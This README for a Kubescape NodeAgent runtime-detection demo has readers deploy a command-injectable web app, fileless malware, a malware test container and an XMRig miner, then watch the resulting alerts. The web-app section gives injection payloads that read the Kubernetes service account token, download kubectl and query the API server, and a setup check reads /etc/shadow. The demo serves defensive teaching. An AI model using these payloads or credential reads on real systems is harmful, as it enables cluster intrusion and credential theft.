# Node Agent Runtime Detection & Response Demo

<p align="center">
  <b>🛡️ See NodeAgent detect real attacks in real-time</b>
</p>

This hands-on demo walks you through NodeAgent's runtime threat detection capabilities. You'll deploy vulnerable applications, execute real attack techniques, and watch NodeAgent detect them instantly.

## 🎯 What You'll Learn

| Demo | Attack Technique | Detection Method |
|------|-----------------|------------------|
| [Web App Attack](#-attack-1-web-application-command-injection) | Command Injection (OWASP Top 10) | Unexpected process execution |
| [Fileless Malware](#-attack-2-fileless-malware) | Memory-only execution | Exec from `/proc/self/fd` |
| [Malicious Image](#-attack-3-malicious-container-image) | Embedded malware | ClamAV signature detection |
| [Crypto Mining](#-attack-4-cryptocurrency-mining) | XMRig miner | RandomX instruction detection |

**Time to complete:** ~30 minutes

## 📖 Table of Contents

- [Prerequisites](#prerequisites)
- [Installation](#-installation)
  - [Step 1: Set Up a Cluster](#step-1-set-up-a-cluster)
  - [Step 2: Install AlertManager (Optional)](#step-2-install-alertmanager-optional)
  - [Step 3: Install NodeAgent](#step-3-install-nodeagent)
  - [Step 4: Verify Installation](#step-4-verify-installation)
- [Attack 1: Web Application Command Injection](#-attack-1-web-application-command-injection)
- [Attack 2: Fileless Malware](#-attack-2-fileless-malware)
- [Attack 3: Malicious Container Image](#-attack-3-malicious-container-image)
- [Attack 4: Cryptocurrency Mining](#-attack-4-cryptocurrency-mining)
- [Cleanup](#-cleanup)
- [Next Steps](#-next-steps)

## Prerequisites

- **Kubernetes cluster** (Minikube, Kind, or any cloud provider)
- **kubectl** configured to access your cluster
- **Helm** v3.x installed
- **~15 minutes** for NodeAgent to complete its learning period

## 🚀 Installation

### Step 1: Set Up a Cluster

If you don't have a cluster, create one locally:

**Using Minikube:**
```bash
minikube start --cpus=4 --memory=8192
```

**Using Kind:**
```bash
kind create cluster --name security-demo
```

### Step 2: Install AlertManager (Optional)

AlertManager provides a UI to view alerts. Skip this if you prefer viewing logs directly.

```bash
# Add Prometheus community Helm repo
helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
helm repo update

# Install kube-prometheus-stack (includes AlertManager)
helm install alertmanager prometheus-community/kube-prometheus-stack \
  -n monitoring --create-namespace \
  --set prometheus.enabled=false \
  --set grafana.enabled=false
```

**Verify AlertManager is running:**
```bash
kubectl get pods -n monitoring -l app.kubernetes.io/name=alertmanager
```

**Expected output:**
```
NAME                                     READY   STATUS    RESTARTS   AGE
alertmanager-alertmanager-0              2/2     Running   0          60s
```

### Step 3: Install NodeAgent

Clone this repository and install NodeAgent with Helm:

```bash
# Clone the repository
git clone https://github.com/kubescape/node-agent.git
cd node-agent

# Install Kubescape with NodeAgent
helm repo add kubescape https://kubescape.github.io/helm-charts/
helm repo update

# With AlertManager integration
helm upgrade --install kubescape kubescape/kubescape-operator \
  -n kubescape --create-namespace \
  --set clusterName=$(kubectl config current-context) \
  --set capabilities.runtimeDetection=enable \
  --set capabilities.malwareDetection=enable \
  --set alertCRD.installDefault=true \
  --set alertCRD.scopeClustered=true \
  --set nodeAgent.config.alertManagerExporterUrls=alertmanager-operated.monitoring.svc.cluster.local:9093 \
  --set nodeAgent.config.maxLearningPeriod=15m \
  --set nodeAgent.config.learningPeriod=2m \
  --set nodeAgent.config.updatePeriod=1m

# Without AlertManager (alerts go to stdout only)
# helm upgrade --install kubescape kubescape/kubescape-operator \
#   -n kubescape --create-namespace \
#   --set clusterName=$(kubectl config current-context) \
#   --set capabilities.runtimeDetection=enable \
#   --set capabilities.malwareDetection=enable \
#   --set alertCRD.installDefault=true
```

### Step 4: Verify Installation

```bash
# Check NodeAgent pods are running
kubectl get pods -n kubescape -l app=node-agent

# Expected output:
# NAME               READY   STATUS    RESTARTS   AGE
# node-agent-xxxxx   1/1     Running   0          60s

# Watch logs for startup messages
kubectl logs -n kubescape -l app=node-agent -f --tail=50
```

### ⏱️ Wait for Learning Period

NodeAgent needs ~2 minutes to learn normal cluster behavior. During this time:

- ✅ Malicious activity alerts are generated immediately
- ⏳ Anomaly detection alerts start after learning completes

**Test that NodeAgent is working:**
```bash
# After 2 minutes, run this in any pod:
kubectl exec -it $(kubectl get pod -o name | head -1) -- cat /etc/shadow 2>/dev/null || echo "Command blocked or file not accessible"

# Check for alerts:
kubectl logs -n kubescape -l app=node-agent --tail=20 | grep -i alert
```

---

## 🎯 Attack 1: Web Application Command Injection

This demo shows how attackers exploit command injection vulnerabilities to execute arbitrary commands.

### Deploy the Vulnerable Application

```bash
# Make setup script executable and run it
chmod +x demo/general_attack/webapp/setup.sh
./demo/general_attack/webapp/setup.sh

# Wait for the pod to be ready
kubectl wait --for=condition=Ready pod -l app=webapp --timeout=120s
```

### Access the Application

```bash
# Port-forward to access the web app
kubectl port-forward svc/webapp 8080:8080 &

# Open in browser or use curl
echo "Open http://localhost:8080 in your browser"
```

You should see a "Ping Service" application:

![Web Application](assets/webapp.png)

### Execute the Attacks

The application concatenates user input directly into a shell command without sanitization.

**Attack 1: List files**
```
Input: 1.1.1.1;ls
```

![ls command](assets/ls.png)

**Expected alert:** "Unexpected process launched" or "Unexpected file access"

**Attack 2: Read service account token**
```
Input: 1.1.1.1;cat /run/secrets/kubernetes.io/serviceaccount/token
```

![Service Account Token](assets/service-account-token.png)

**Expected alert:** "Kubernetes service account token accessed"

**Attack 3: Download and execute kubectl**
```bash
# Step 1: Get node architecture
Input: 1.1.1.1;uname -m | sed 's/x86_64/amd64/g' | sed 's/aarch64/arm64/g'

# Step 2: Download kubectl (replace <arch> with output from step 1)
Input: 1.1.1.1;curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/<arch>/kubectl"

# Step 3: Make executable
Input: 1.1.1.1;chmod +x kubectl

# Step 4: Access Kubernetes API
Input: 1.1.1.1;./kubectl --server https://kubernetes.default --insecure-skip-tls-verify --token $(cat /run/secrets/kubernetes.io/serviceaccount/token) get pods
```

![kubectl execution](assets/kubectl.png)

**Expected alert:** "Kubernetes API server access detected"

### View Alerts

**Option A: AlertManager UI**
```bash
kubectl port-forward svc/alertmanager-operated 9093:9093 -n monitoring &
echo "Open http://localhost:9093 in your browser"
```

![AlertManager](assets/alertmanager.png)

**Option B: NodeAgent logs**
```bash
kubectl logs -n kubescape -l app=node-agent -f | grep -E "(ALERT|Rule.*failed)"
```

---

## 🎯 Attack 2: Fileless Malware

Fileless malware runs entirely in memory, leaving no files on disk. This makes it extremely difficult to detect with traditional file-based scanners.

### Deploy the Infected Application

We'll deploy Google's [microservices demo](https://github.com/GoogleCloudPlatform/microservices-demo) with one image replaced by a fileless malware sample.

```bash
kubectl apply -f demo/fileless_exec/kubernetes-manifest.yaml

# Wait for deployment
kubectl wait --for=condition=Ready pods --all --timeout=300s
```

> ⚠️ **Note:** The malware is a benign demonstration. It doesn't perform any malicious actions.

### How It Works

The malware uses the [Ezuri crypter](https://github.com/guitmz/ezuri) to:
1. Decrypt the payload in memory
2. Write it to a memory-backed file descriptor
3. Execute directly from `/proc/self/fd/3`

### View the Detection

```bash
# Check NodeAgent logs
kubectl logs -n kubescape -l app=node-agent --tail=100 | grep -i fileless
```

![Fileless Malware Detection](assets/fileless-malware.png)

**Expected alert:** "Exec from malicious source" with path `/proc/self/fd/3`

---

## 🎯 Attack 3: Malicious Container Image

This demo shows NodeAgent's ClamAV-based malware scanning detecting malicious files embedded in container images.

### Deploy the Malicious Container

Using [ruzickap's malware test container](https://github.com/ruzickap/malware-cryptominer-container):

```bash
kubectl run malware-cryptominer \
  --image=quay.io/petr_ruzicka/malware-cryptominer-container:2.0.2

# Wait for the container to start
kubectl wait --for=condition=Ready pod/malware-cryptominer --timeout=120s
```

### Alternative: Build Your Own

```bash
# Build locally
docker build -t malware-cryptominer -f demo/malwares_image/Containerfile .

# Load into your cluster
# For Minikube:
minikube image load malware-cryptominer

# For Kind:
kind load docker-image malware-cryptominer
```

### View the Detection

```bash
# Check for malware alerts
kubectl logs -n kubescape -l app=node-agent --tail=50 | grep -i malware
```

![Malware Detection](assets/malwares.png)

**Expected alert:** Malware detection with:
- File path on the node
- ClamAV signature name
- Malware type (cryptominer, webshell, etc.)

### About ClamAV Integration

NodeAgent uses [ClamAV](https://www.clamav.net/), an open-source antivirus engine that supports:
- Signature-based detection
- YARA rules
- Bytecode signatures
- Regular database updates

> 📝 **Note:** Malware detection must be enabled: `--set capabilities.malwareDetection=enable`

---

## 🎯 Attack 4: Cryptocurrency Mining

NodeAgent detects crypto mining by monitoring for RandomX instructions, used by Monero (XMR) miners.

### Deploy the Miner

```bash
kubectl apply -f demo/miner/miner-pod.yaml

# Wait for the pod to start
kubectl wait --for=condition=Ready pod -l app=xmrig --timeout=120s
```

### View the Detection

```bash
# Check for mining alerts
kubectl logs -n kubescape -l app=node-agent --tail=50 | grep -i -E "(miner|mining|randomx|crypto)"
```

**Expected alert:** "Crypto mining detected" or "RandomX instructions detected"

### How Detection Works

NodeAgent's RandomX tracer monitors for CPU instructions characteristic of the RandomX proof-of-work algorithm:
- AES-NI instructions in specific patterns
- Large memory allocation patterns
- Characteristic computational loops

---

## 🧹 Cleanup

Remove all demo resources:

```bash
# Remove demo applications
./demo/general_attack/webapp/cleanup.sh 2>/dev/null || true
kubectl delete -f demo/fileless_exec/kubernetes-manifest.yaml 2>/dev/null || true
kubectl delete pod malware-cryptominer 2>/dev/null || true
kubectl delete -f demo/miner/miner-pod.yaml 2>/dev/null || true

# Remove NodeAgent (optional)
helm uninstall kubescape -n kubescape
kubectl delete namespace kubescape

# Remove AlertManager (optional)
helm uninstall alertmanager -n monitoring
kubectl delete namespace monitoring

# Stop port-forwards
pkill -f "kubectl port-forward"
```

---

## 📚 Next Steps

### Learn More

- 📖 [NodeAgent Documentation](../README.md)
- 📖 [Kubescape Documentation](https://kubescape.io/docs/)
- 📖 [Detection Rules Reference](https://kubescape.io/docs/)
- 📖 [Configuration Guide](../docs/CONFIGURATION.md)

### Advanced Topics

- **Custom Rules:** Create your own detection rules with CEL expressions
- **Alert Integration:** Connect to PagerDuty, Slack, or your SIEM
- **Application Profiling:** Fine-tune baseline behavior per application
- **Seccomp Profiles:** Auto-generate and apply seccomp profiles

### Get Help

- 💬 [CNCF Slack #kubescape](https://cloud-native.slack.com/archives/C04EY3ZF9GE)
- 🐛 [GitHub Issues](https://github.com/kubescape/node-agent/issues)
- 📧 [Email Support](mailto:support@armosec.io)

---

<p align="center">
  <b>Happy hunting! 🎯</b>
</p>